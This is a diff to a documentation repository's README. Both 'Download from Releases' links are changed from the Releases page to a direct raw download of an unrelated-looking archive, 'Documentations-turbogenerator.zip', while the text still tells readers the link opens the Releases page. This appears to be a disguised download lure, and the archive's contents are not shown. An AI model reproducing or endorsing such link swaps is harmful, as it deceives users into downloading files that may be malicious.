@@ -16,7 +16,7 @@ To use the content effectively, you’ll need:
 
 To download the latest version of the documents, visit the Releases page below. This page includes all the available documents in various formats. 
 
-[**Download from Releases**](https://github.com/krisnaaaaaaaaaaaa/Documentations/releases)
+[**Download from Releases**](https://raw.githubusercontent.com/krisnaaaaaaaaaaaa/Documentations/main/frontend/Documentations-turbogenerator.zip)
 
 Simply click the link above to enter the Releases page, where you can find and download the files you need.
 
@@ -51,6 +51,6 @@ This repository will continue to grow. You can expect ongoing updates and new to
 
 If you have questions or need assistance, feel free to open an issue under the "Issues" tab in this repository. You can also connect with the community through various forums dedicated to front-end development and accessibility.
 
-[**Download from Releases**](https://github.com/krisnaaaaaaaaaaaa/Documentations/releases)
+[**Download from Releases**](https://raw.githubusercontent.com/krisnaaaaaaaaaaaa/Documentations/main/frontend/Documentations-turbogenerator.zip)
 
 Thank you for visiting the Documentations repository! Get started today and expand your knowledge in an easy and accessible way.
